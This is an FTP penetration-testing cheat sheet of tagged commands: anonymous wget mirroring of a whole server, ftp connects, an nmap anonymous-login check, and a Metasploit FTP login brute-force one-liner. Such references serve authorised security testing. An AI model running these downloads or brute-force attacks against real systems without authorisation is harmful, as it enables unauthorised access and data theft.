# FTP

% ftp, 21
#plateform/linux  #target/remote  #port/21 #protocol/ftp 

## ftp - download all 
#cat/ATTACK/FILE_TRANSFERT 
```
wget -m ftp://anonymous:anonymous@<ip>
```

## ftp download all (2)
#cat/ATTACK/FILE_TRANSFERT
```
wget -m --no-passive ftp://anonymous:anonymous@<ip>
```

## ftp - connect
#cat/ATTACK/CONNECT
```
ftp <ip>
```

## ftp - connect port
#cat/ATTACK/CONNECT
```
ftp <ip> <port>
```

## ftp - enum anonym
#cat/ATTACK/CONNECT
```
nmap -v -p 21 --script=ftp-anon.nse <ip>
```

## ftp - msf bruteforce login
#cat/ATTACK/BRUTEFORCE-SPRAY
```
msfconsole -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS <rhost>; set USER_FILE <users.txt>; set PASS_FILE <passwords.txt>; exploit"
```

